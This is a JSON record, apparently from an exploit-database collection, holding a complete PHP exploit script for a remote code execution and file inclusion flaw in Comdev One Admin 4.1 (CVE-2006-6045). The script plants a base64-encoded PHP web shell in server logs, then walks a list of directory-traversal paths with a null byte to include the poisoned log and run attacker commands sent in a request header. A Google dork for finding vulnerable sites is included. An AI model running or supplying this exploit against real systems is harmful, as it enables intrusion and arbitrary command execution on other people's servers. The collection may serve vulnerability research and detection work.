{
  "id": "2573",
  "title": "Comdev One Admin 4.1 - &#039;Adminfoot.php&#039; Remote Code Execution",
  "cve": "CVE-2006-6045",
  "vuln_type": "rce",
  "code": "#!/usr/bin/php\r\n<?php\r\n /*********************************************************************\r\n * Comdev One Admin 4.1 Remote Command Execution / File Inclusion Vulnerability\r\n * \r\n * Note:\r\n * Requires register globals to be on, and magic quotes gpc to be off.\r\n *\r\n * Usage: \r\n * php script.php [host] [path] [command]\r\n *\r\n * Usage Example:\r\n * php script.php domain.com /oneadminpro/ whoami\r\n *\r\n * Credit:\r\n * Synsta - Vulnerability discovery and exploit scripting\r\n *\r\n * File Inclusion:\r\n * <host>/<path>/oneadmin/adminfoot.php?path[docroot]=<local/remote file>\r\n *\r\n * Googledork: inurl:/oneadmin/\r\n *\r\n * [w4ck1ng] - w4ck1ng.com\r\n *\r\n *********************************************************************/\r\n \r\nif(!$argv[3 ]){\r\ndie(\"Usage:\r\nphp $argv[0] [host] [path] [command]\\n\r\nUsage Example:\r\nphp $argv[0] domain.com /dolphin/ whoami\\n\");\r\n}\r\n\r\nfunction send($host, $put){\r\nglobal $data;\r\n$conn = fsockopen( gethostbyname($host),\"80\" );\r\nif(!$conn) {\r\ndie(\"Connection to $host failed...\");\r\n}else{\r\nfputs($conn, $put);\r\n}\r\nwhile(!feof($conn)) {\r\n$data .=fgets( $conn);\r\n}\r\nfclose($conn);\r\nreturn $data;\r\n}\r\n\r\n$host = $argv[ 1];\r\n$path = $argv[ 2];\r\n$cmd = $argv[ 3];\r\n\r\nif($argv[3]){\r\n\r\n$shellcode = base64_decode( \"PD9waHAgaWYoJF9TRVJWRVJbSFRUUF9DTURdKXsgZWNobyBjbWR4cGxzdGFydC5zaGVsbF9leGVjKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX0NNRF0pKS5jbWR4cGxlbmQ7IH0gPz4=\");\r\n$req = \"GET \". $path.\"/oneadmin/adminfoot.php?path[docroot]=$shellcode HTTP/1.1\\r\\n\";\r\n$req .=\"Accept-Encoding: text/plain\\r\\n\" ;\r\n$req .=\"Host: \". $host.\"\\r\\n\";\r\n$req .=\"Connection: Close\\r\\n\\r\\n\" ;\r\nsend(\"$host\", \"$req\");\r\n\r\n$logs = array(\"../../../../../var/log/httpd/access_log\" ,\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../logs/access_log\",\r\n\"../../../logs/error_log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\");\r\n\r\n$i = 0; \r\nforeach($logs as $value){ \r\n$logs[$i++];\r\n\r\n$req = \"GET \". $path.\"/oneadmin/adminfoot.php?path[docroot]=$logs[$i]%00 HTTP/1.1\\r\\n\";\r\n$req .=\"CMD: $cmd\\r\\n\";\r\n$req .=\"Accept-Encoding: text/plain\\r\\n\" ;\r\n$req .=\"Host: \". $host.\"\\r\\n\";\r\n$req .=\"Connection: Close\\r\\n\\r\\n\" ;\r\nsend(\"$host\", \"$req\");\r\nprint(\"Trying $logs[$i]..\\n\");\r\n\r\n$adata = explode( \"cmdxplstart\",$data);\r\n$bdata = explode( \"cmdxplend\",$adata[1 ]);\r\n$cdata = $bdata[ 0];\r\n\r\nif(eregi(\"cmdxplend\",  $data)){ \r\nif($cdata==NULL){ \r\ndie(\"\\nExploit succeeded but blank command received..\\n\"); \r\n}\r\ndie(\"\\nExploit Succeeded!\\n\\nCommand Resolution:\\n$cdata\\n\"); \r\n}\r\n}\r\n}\r\n\r\ndie(\"Exploit Failed!\\n\");\r\n?>\r\n\r\n# milw0rm.com [2006-10-16]",
  "url": "https://www.exploit-db.com/exploits/2573"
}